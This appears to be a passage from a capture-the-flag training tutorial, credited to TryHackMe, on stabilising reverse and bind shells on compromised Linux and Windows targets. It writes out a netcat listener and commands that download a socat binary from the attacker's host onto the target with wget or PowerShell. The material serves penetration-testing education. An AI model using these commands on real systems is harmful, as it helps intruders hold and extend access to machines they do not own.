### Technique 1 : python

<BR>The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:

1. The first thing to do is use python -c 'import pty;pty.spawn("/bin/bash")', which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with python2 or python3 as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.<BR>
2. Step two is: export TERM=xterm -- this will give us access to term commands such as clear.<BR>
3. Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.<BR>

### Technique 2 : rlwrap

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with <BR><b>sudo apt install rlwrap</b>.

To use rlwrap, we invoke a slightly different listener:
<br><b>rlwrap nc -lvnp <port></b>

Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use <b>stty raw -echo; fg</b> to stabilise and re-enter the shell.<BR>
  
### Technique 3 : Socat
  The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (<b>sudo python3 -m http.server 80</b>), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (<b>wget <LOCAL-IP>/socat -O /tmp/socat</b>).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (<b>Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe</b>). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.
  
### Dernière astuce 
  
With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.

  First, open another terminal and run <b>stty -a</b>. This will give you a large stream of output. Note down the values for "rows" and columns:



Next, in your reverse/bind shell, type in:

  <b>stty rows <number></b>

and

    <b>stty cols <number></b>

Filling in the numbers you got from running the command in your own terminal.

This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.
  
  Source : Tryhackme
